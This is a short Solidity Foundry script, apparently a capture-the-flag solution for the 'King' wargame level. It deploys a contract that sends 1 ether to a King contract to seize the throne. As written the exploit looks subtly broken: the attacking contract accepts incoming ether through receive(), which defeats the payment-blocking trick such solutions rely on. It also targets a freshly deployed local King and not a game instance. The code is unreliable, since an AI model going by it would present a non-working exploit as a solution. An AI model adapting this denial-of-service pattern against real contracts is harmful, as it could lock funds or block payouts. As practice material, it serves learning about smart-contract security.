// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {King} from "../instances/Ilevel09.sol";

contract Attacker is Test {
    King king = new King();

    function test() external {
        vm.startBroadcast();
        NewKing newKing = new NewKing{value: 1 ether}(king);
        vm.stopBroadcast();
    }
}

contract NewKing {
    constructor(King king) payable {
        address(king).call{value: 1 ether}("");
    }

    receive() external payable {}
}
